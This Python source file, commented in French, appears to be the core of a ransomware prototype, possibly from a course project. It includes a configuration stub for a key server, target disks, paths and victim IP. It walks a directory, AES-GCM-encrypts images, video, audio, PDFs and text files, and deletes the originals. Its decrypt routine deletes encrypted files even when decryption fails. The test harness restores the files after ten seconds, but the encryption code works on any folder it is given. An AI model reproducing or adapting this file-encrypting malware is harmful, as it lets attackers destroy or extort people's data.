import socket
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import utile.network as network
import utile.message as message
import utile.config as config
import psutil
import platform
import hashlib
import time

KEY_FILE_PATH = 'encryption_key.bin'  # Chemin du fichier pour stocker la clé de chiffrement

# constantes
IP_SERVEUR_FRONT = 'localhost'
PORT_SERVEUR_FRONT = 8443
CONFIG_WORKSTATION = {
    'HASH': None,
    'IP': None,
    'KEY': None,  # Clé à récupérer du serveur de clés
    'DISKS': None,
    'PATHS': None,
    'FILE_EXT': None,
    'FREQ': None,
    'TYPE': None,
    'OS': None,
    'STATE': None,
}


def save_encryption_key_to_file(key):
    """
    Enregistre la clé de chiffrement dans un fichier.

    :param key: (bytes) Clé de chiffrement à enregistrer.
    """
    with open(KEY_FILE_PATH, 'wb') as key_file:
        key_file.write(key)


def load_encryption_key_from_file():
    """
    Charge la clé de chiffrement à partir du fichier.

    :return: (bytes) Clé de chiffrement chargée.
    """
    with open(KEY_FILE_PATH, 'rb') as key_file:
        return key_file.read()


def generate_encryption_key_sha256(key_length=32):
    """
    Génère une clé de chiffrement en utilisant SHA-256.

    :param key_length: (int) Longueur de la clé en octets (par défaut 32).
    :return: (bytes) Clé de chiffrement générée.
    """
    random_data = os.urandom(64)  # Génère une séquence de bytes aléatoire pour renforcer l'entropie
    hash_object = hashlib.sha256(random_data)
    hashed_data = hash_object.digest()
    return hashed_data[:key_length]


# Si la clé n'existe pas déjà, générer une nouvelle clé et l'enregistrer dans un fichier
if not os.path.isfile(KEY_FILE_PATH):
    encryption_key_sha256 = generate_encryption_key_sha256(32)
    save_encryption_key_to_file(encryption_key_sha256)
else:
    # Si la clé existe déjà, charger la clé à partir du fichier
    encryption_key_sha256 = load_encryption_key_from_file()


def encrypt_files_in_directory(directory, key, extensions):
    """
    Chiffre tous les fichiers d'un dossier en fonction de leurs extensions
    :param directory: (str) Chemin vers le dossier contenant les fichiers à chiffrer
    :param key: (bytes) Clé de chiffrement
    :param extensions: (list) Liste des extensions des fichiers à chiffrer
    """
    # Parcourir tous les fichiers du dossier
    for root, dirs, files in os.walk(directory):
        for file in files:
            # Vérifier si l'extension du fichier est dans la liste des extensions à chiffrer
            if os.path.splitext(file)[1] in extensions:
                file_path = os.path.join(root, file)
                # Lire le contenu du fichier
                with open(file_path, 'rb') as f:
                    data = f.read()
                # Générer un nonce unique
                nonce = get_random_bytes(12)
                # Créer une instance AES avec la clé et le nonce
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                # Chiffrer les données
                ciphertext, tag = cipher.encrypt_and_digest(data)
                # Écrire les données chiffrées dans un nouveau fichier avec une extension .encrypted
                encrypted_file_path = file_path + '.encrypted'
                with open(encrypted_file_path, 'wb') as f:
                    f.write(nonce + ciphertext + tag)
                # Supprimer le fichier non chiffré
                os.remove(file_path)
                print("Fichier chiffré:", file_path)


def decrypt_files_in_directory(directory, key, extensions):
    """
    Déchiffre tous les fichiers d'un dossier en fonction de leurs extensions
    :param directory: (str) Chemin vers le dossier contenant les fichiers à déchiffrer
    :param key: (bytes) Clé de déchiffrement
    :param extensions: (list) Liste des extensions des fichiers à déchiffrer
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            if os.path.splitext(file)[1] == '.encrypted':
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()

                # Extraire le nonce, le texte chiffré et le tag
                nonce = encrypted_data[:12]
                ciphertext = encrypted_data[12:-16]
                tag = encrypted_data[-16:]

                # Créer une instance AES avec la clé et le nonce
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

                try:
                    # Déchiffrer les données
                    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

                    # Écrire les données déchiffrées dans un nouveau fichier
                    decrypted_file_path = file_path[:-len('.encrypted')]  # Retirer l'extension .encrypted
                    with open(decrypted_file_path, 'wb') as f:
                        f.write(decrypted_data)

                    print("Fichier déchiffré:", decrypted_file_path)  # Déplacer cette ligne après la suppression
                except ValueError:
                    print("Échec du déchiffrement du fichier:", file_path)

                # Supprimer le fichier chiffré après avoir déchiffré avec succès
                os.remove(file_path)


def main():
    # Chemin du répertoire de test
    directory = 'D:/tests_2'

    # Extensions des fichiers à chiffrer
    extensions = ['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf']

    # Chiffrer les fichiers dans le répertoire de test
    encrypt_files_in_directory(directory, encryption_key_sha256, extensions)
    time.sleep(10)
    decrypt_files_in_directory(directory, encryption_key_sha256, extensions)


if __name__ == '__main__':
    main()
